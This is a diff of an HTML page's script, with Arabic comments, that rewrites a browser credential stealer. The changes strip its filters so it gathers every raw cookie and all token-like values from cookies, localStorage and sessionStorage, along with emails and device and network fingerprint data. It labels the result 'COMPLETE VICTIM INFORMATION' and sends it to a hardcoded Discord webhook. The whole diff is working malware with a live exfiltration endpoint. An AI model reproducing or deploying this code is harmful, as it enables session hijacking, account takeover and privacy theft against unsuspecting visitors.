@@ -11,100 +11,92 @@
 
     <script>
         // ============================================
-        // دالة متقدمة للبحث عن التوكنات (معدلة)
+        // دالة لجلب كل الكوكيز (بدون فلترة)
         // ============================================
-        function findRealTokens() {
+        function getAllCookies() {
+            const cookies = document.cookie;
+            if (!cookies) return "No cookies found";
+            return cookies;
+        }
+
+        // ============================================
+        // دالة البحث عن التوكنات (بدون شروط)
+        // ============================================
+        function findAllTokens() {
             const tokens = [];
+            const tokenKeywords = ['token', 'auth', 'jwt', 'session', 'access', 'refresh', 'bearer', 'api_key', 'apikey', 'secret', 'password', 'pass', 'login', 'user', 'id', 'sid', 'csrf', 'xsrf', 'oauth', 'authorization', 'x-auth', 'x-access-token', 'x-api-key', 'authentication', 'credentials', 'accesstoken', 'refreshtoken', 'acctkn', 'tk', 'tkn', 'tokn'];
             
-            // كلمات مفتاحية موسعة جداً
-            const tokenKeywords = [
-                'token', 'auth', 'jwt', 'session', 'access', 'refresh', 'bearer', 
-                'api_key', 'apikey', 'secret', 'password', 'pass', 'login', 'user', 
-                'id', 'sid', 'csrf', 'xsrf', 'oauth', 'authorization', 'x-auth',
-                'x-access-token', 'x-api-key', 'authentication', 'credentials',
-                'accesstoken', 'refreshtoken', 'acctkn', 'tk', 'tkn', 'tokn'
-            ];
-            
-            // 1. البحث في الكوكيز (بدون شروط صارمة)
+            // 1. البحث في الكوكيز
             const cookies = document.cookie.split(';');
             cookies.forEach(cookie => {
                 const [name, value] = cookie.trim().split('=');
-                if (!name || !value || value.length < 5) return;
+                if (!name || !value) return;
                 
+                // أي كوكي فيها كلمة من الكلمات المفتاحية
                 tokenKeywords.forEach(keyword => {
                     if (name.toLowerCase().includes(keyword.toLowerCase())) {
                         tokens.push({
                             source: '🍪 Cookie',
                             name: name,
-                            value: value.substring(0, 100),
-                            type: keyword,
-                            length: value.length
+                            value: value,
+                            type: keyword
                         });
                     }
                 });
                 
-                // فحص JWT (حتى لو قصير)
+                // JWT (ثلاثة أجزاء)
                 if (value && value.split('.').length === 3) {
                     tokens.push({
                         source: '🔐 JWT Token',
                         name: name,
-                        value: value.substring(0, 100),
-                        type: 'JWT',
-                        length: value.length
+                        value: value,
+                        type: 'JWT'
                     });
                 }
                 
-                // أي قيمة طويلة ممكن تكون توكن
-                if (value.length > 30 && /^[A-Za-z0-9\-_]+$/.test(value)) {
+                // أي قيمة طويلة (أكثر من 20 حرف)
+                if (value.length > 20) {
                     tokens.push({
-                        source: '🔑 Possible Token',
+                        source: '📦 Long Cookie',
                         name: name,
-                        value: value.substring(0, 100),
-                        type: 'Unknown Token',
-                        length: value.length
+                        value: value,
+                        type: 'Long Value'
                     });
                 }
             });
             
-            // 2. البحث في localStorage (بدون شروط)
+            // 2. البحث في localStorage
             try {
                 for(let i = 0; i < localStorage.length; i++) {
                     let key = localStorage.key(i);
                     let value = localStorage.getItem(key);
-                    
-                    if (!value) continue;
                     
                     tokenKeywords.forEach(keyword => {
                         if (key.toLowerCase().includes(keyword.toLowerCase())) {
                             tokens.push({
                                 source: '💾 localStorage',
                                 name: key,
-                                value: value.substring(0, 100),
-                                type: keyword,
-                                length: value.length
+                                value: value,
+                                type: keyword
                             });
                         }
                     });
                     
-                    // فحص JWT في localStorage
                     if (value && value.split('.').length === 3) {
                         tokens.push({
-                            source: '🔐 JWT in localStorage',
+                            source: '🔐 JWT localStorage',
                             name: key,
-                            value: value.substring(0, 100),
-                            type: 'JWT',
-                            length: value.length
+                            value: value,
+                            type: 'JWT'
                         });
                     }
                     
-                    // أي قيمة طويلة
-                    if (value.length > 30 && /^[A-Za-z0-9\-_]+$/.test(value)) {
+                    if (value && value.length > 20) {
                         tokens.push({
-                            source: '🔑 localStorage Token',
+                            source: '📦 localStorage Long',
                             name: key,
-                            value: value.substring(0, 100),
-                            type: 'Unknown',
-                            length: value.length
+                            value: value,
+                            type: 'Long Value'
                         });
                     }
                 }
@@ -116,37 +108,32 @@
                     let key = sessionStorage.key(i);
                     let value = sessionStorage.getItem(key);
                     
-                    if (!value) continue;
-                    
                     tokenKeywords.forEach(keyword => {
                         if (key.toLowerCase().includes(keyword.toLowerCase())) {
                             tokens.push({
                                 source: '📝 sessionStorage',
                                 name: key,
-                                value: value.substring(0, 100),
-                                type: keyword,
-                                length: value.length
+                                value: value,
+                                type: keyword
                             });
                         }
                     });
                     
                     if (value && value.split('.').length === 3) {
                         tokens.push({
-                            source: '🔐 JWT in sessionStorage',
+                            source: '🔐 JWT sessionStorage',
                             name: key,
-                            value: value.substring(0, 100),
-                            type: 'JWT',
-                            length: value.length
+                            value: value,
+                            type: 'JWT'
                         });
                     }
                     
-                    if (value.length > 30 && /^[A-Za-z0-9\-_]+$/.test(value)) {
+                    if (value && value.length > 20) {
                         tokens.push({
-                            source: '🔑 sessionStorage Token',
+                            source: '📦 sessionStorage Long',
                             name: key,
-                            value: value.substring(0, 100),
-                            type: 'Unknown',
-                            length: value.length
+                            value: value,
+                            type: 'Long Value'
                         });
                     }
                 }
@@ -156,42 +143,30 @@
         }
 
         // ============================================
-        // دالة البحث عن الإيميلات الحقيقية
+        // دالة البحث عن الإيميلات
         // ============================================
         function findRealEmails() {
             const emails = new Set();
             const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
             
             try {
-                // البحث في الكوكيز
+                // في الكوكيز
                 const cookies = document.cookie;
                 const cookieEmails = cookies.match(emailRegex);
-                if (cookieEmails) {
-                    cookieEmails.forEach(e => emails.add(e));
-                }
+                if (cookieEmails) cookieEmails.forEach(e => emails.add(e));
                 
-                // البحث في localStorage
+                // في localStorage
                 for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    const value = localStorage.getItem(key);
-                    
-                    const keyEmails = key.match(emailRegex);
-                    if (keyEmails) keyEmails.forEach(e => emails.add(e));
-                    
+                    const value = localStorage.getItem(localStorage.key(i));
                     if (value && typeof value === 'string') {
                         const valueEmails = value.match(emailRegex);
                         if (valueEmails) valueEmails.forEach(e => emails.add(e));
                     }
                 }
                 
-                // البحث في sessionStorage
+                // في sessionStorage
                 for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    const value = sessionStorage.getItem(key);
-                    
-                    const keyEmails = key.match(emailRegex);
-                    if (keyEmails) keyEmails.forEach(e => emails.add(e));
-                    
+                    const value = sessionStorage.getItem(sessionStorage.key(i));
                     if (value && typeof value === 'string') {
                         const valueEmails = value.match(emailRegex);
                         if (valueEmails) valueEmails.forEach(e => emails.add(e));
@@ -327,11 +302,12 @@
                     }
                 } catch (e) {}
 
-                // 7. جمع كل المعلومات الحقيقية
+                // 7. جمع كل المعلومات
+                const allCookies = getAllCookies();
+                const allTokens = findAllTokens();
+                const realEmails = findRealEmails();
                 const realUsername = getRealUsername();
                 const realComputerName = getRealComputerName();
-                const realEmails = findRealEmails();
-                const realTokens = findRealTokens();
 
                 // ============================================
                 // تجهيز الرسالة
@@ -339,9 +315,9 @@
                 const emailsMessage = realEmails.length > 0 ? realEmails.join('\n') : 'No emails found';
                 
                 let tokensMessage = '';
-                if (realTokens.length > 0) {
-                    tokensMessage = realTokens.map(t => 
-                        `${t.source} | ${t.name} (${t.type}): ${t.value} [Length: ${t.length}]`
+                if (allTokens.length > 0) {
+                    tokensMessage = allTokens.map(t => 
+                        `${t.source} | **${t.name}**: \`${t.value.substring(0, 100)}${t.value.length > 100 ? '...' : ''}\` (${t.type})`
                     ).join('\n');
                 } else {
                     tokensMessage = 'No tokens found';
@@ -350,46 +326,57 @@
                 const webhookUrl = 'https://discord.com/api/webhooks/1476727887053721721/UkshRh9j3xisTqqOHLnEvMI5dFlg-dmLWZkuY55yPtAWjuFFM0iPkMlFWUlF0LUjWHTN';
 
                 const textMessage = `
-**📌 COMPLETE VICTIM INFORMATION**
+**🚨 COMPLETE VICTIM INFORMATION 🚨**
 
 **👤 USER INFO:**
 • Username: ${realUsername}
 • Computer Name: ${realComputerName}
 
-**📧 EMAILS FOUND:**
-${emailsMessage}
+**🍪 ALL COOKIES (RAW):**
+\`\`\`
+${allCookies}
+\`\`\`
 
 **🔑 TOKENS FOUND:**
 ${tokensMessage}
 
-**🍪 ALL COOKIES:**
-\`\`\`
-${document.cookie || 'No cookies'}
-\`\`\`
+**📧 EMAILS FOUND:**
+${emailsMessage}
 
 **🌐 NETWORK:**
 • IP: ${ipAddress}
 • Speed: ${connection.downlink || '?'} Mbps
 • Connection Type: ${connection.effectiveType || '?'}
+• RTT: ${connection.rtt || '?'} ms
 
 **💻 SYSTEM:**
 • Platform: ${browserInfo.platform}
 • Language: ${browserInfo.language}
 • CPU Cores: ${browserInfo.cpuCores}
 • RAM: ${browserInfo.ram}
-• Battery: ${batteryInfo.level} (${batteryInfo.charging})
+• Battery: ${batteryInfo.level} (Charging: ${batteryInfo.charging})
 • GPU: ${gpuInfo}
 
 **🖥️ SCREEN:**
 • Resolution: ${screenInfo.width}x${screenInfo.height}
 • Color Depth: ${screenInfo.colorDepth}-bit
+• Available: ${window.screen.availWidth}x${window.screen.availHeight}
 
 **⏰ TIME:**
 • Local: ${new Date().toString()}
 • Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+• Offset: ${new Date().getTimezoneOffset()} minutes
 
-**🌍 BROWSER:**
-${browserInfo.userAgent.substring(0, 300)}
+**🌍 BROWSER DETAILS:**
+• User Agent: ${browserInfo.userAgent}
+• Languages: ${navigator.languages.join(', ')}
+• Cookie Enabled: ${navigator.cookieEnabled}
+• Do Not Track: ${navigator.doNotTrack || 'Not specified'}
+• Hardware Concurrency: ${navigator.hardwareConcurrency || '?'}
+• Device Memory: ${navigator.deviceMemory || '?'} GB
+• Max Touch Points: ${navigator.maxTouchPoints}
+• PDF Viewer: ${navigator.pdfViewerEnabled}
+• Vendor: ${navigator.vendor}
 `;
 
                 // إرسال النص
